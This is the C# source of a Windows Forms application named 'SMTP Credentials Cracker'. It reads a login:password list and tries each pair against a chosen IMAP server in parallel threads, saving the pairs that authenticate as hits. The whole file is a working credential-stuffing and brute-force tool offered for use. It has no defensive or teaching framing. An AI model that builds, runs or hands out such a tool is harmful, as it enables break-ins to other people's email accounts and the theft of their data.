using MailKit.Net.Imap;
using MailKit.Security;
using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace SMTP_Credentials_Cracker
{
    public partial class Main : Form
    {
        private readonly List<string> _hits = new();
        private string _wordlistPath, _host;
        private int _port, _currentLine, _failedCounter, _hitsCounter;
        private long _linesCount;

        public Main()
        {
            InitializeComponent();
            textBox1.AutoSize = false;
            textBox1.Size = new Size(395, 25);
        }

        public static bool TryAuthenticate(string login, string password, string server, int port)
        {
            try
            {
                var smtp = new ImapClient();
                smtp.Timeout = 250;
                smtp.Connect(server, port, SecureSocketOptions.SslOnConnect);
                smtp.Authenticate(login, password);
                var result = smtp.IsAuthenticated;
                smtp.Disconnect(true);
                return result;
            }

            catch (Exception)
            {
                return false;
            }
        }


        private void button1_Click(object sender, EventArgs e)
        {
        }

        private void button1_Click_1(object sender, EventArgs e)
        {
            _host = textBoxHost.Text;
            _port = Convert.ToInt32(textBoxPort.Text);
            var maxThreads = Convert.ToInt32(textBoxThreads.Text);

            new Thread(ProgressWatcher).Start();

            ThreadPool.SetMaxThreads(maxThreads, maxThreads);

            using var reader = new StreamReader(_wordlistPath);

            string line;
            while ((line = reader.ReadLine()) != null)
            {
                ThreadPool.QueueUserWorkItem(ProcessLine, line.Split(':'));
                Thread.Sleep(100);
            }
        }

        private void Form1_Load(object sender, EventArgs e)
        {
        }

        private void ProcessLine(object line)
        {
            var _line = (string[]) line;

            if (TryAuthenticate(_line[0], _line[1], _host, _port))
            {
                _hits.Add($"{_line[0]}:{_line[1]}");
                _hitsCounter++;
            }
            else
                _failedCounter++;

            _currentLine++;
        }

        private void ProgressWatcher()
        {
            while (_currentLine < _linesCount)
            {
                //Thread thisThread = Thread.CurrentThread;

                progressLabel.Invoke((MethodInvoker) delegate
                {
                    progressLabel.Text = $@"Progress {_currentLine} of {_linesCount}";
                });

                textBoxWorkingThreads.Invoke((MethodInvoker) delegate
                {
                    textBoxWorkingThreads.Text = ThreadPool.ThreadCount.ToString();
                });

                progressBar1.Invoke((MethodInvoker) delegate { progressBar1.Value++; });

                textBoxSuccess.Invoke((MethodInvoker) delegate { textBoxSuccess.Text = _hitsCounter.ToString(); });

                textBoxSuccess.Invoke((MethodInvoker) delegate { textBoxFailed.Text = _failedCounter.ToString(); });

                Thread.Sleep(100);
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            OpenFileDialog openFileDialog = new OpenFileDialog();
            openFileDialog.Filter = @"Text files (*.txt)|*.txt|All files (*.*)|*.*";

            if (openFileDialog.ShowDialog() == DialogResult.OK)
            {
                _wordlistPath = openFileDialog.FileName;
                textBox1.Text = _wordlistPath;
                _linesCount = CountLines();
                progressLabel.Text = $@"Progress {_currentLine} of {_linesCount}";
                progressBar1.Maximum = (int) _linesCount;
            }
        }

        private long CountLines()
        {
            var fs = new FileStream(_wordlistPath, FileMode.Open, FileAccess.Read, FileShare.None, 1024 * 1024);
            long lineCount = 0;
            var buffer = new byte[1024 * 1024];
            int bytesRead;

            do
            {
                bytesRead = fs.Read(buffer, 0, buffer.Length);
                for (var i = 0; i < bytesRead; i++)
                    if (buffer[i] == '\n')
                        lineCount++;
            } while (bytesRead > 0);

            fs.Close();

            return lineCount;
        }
    }
}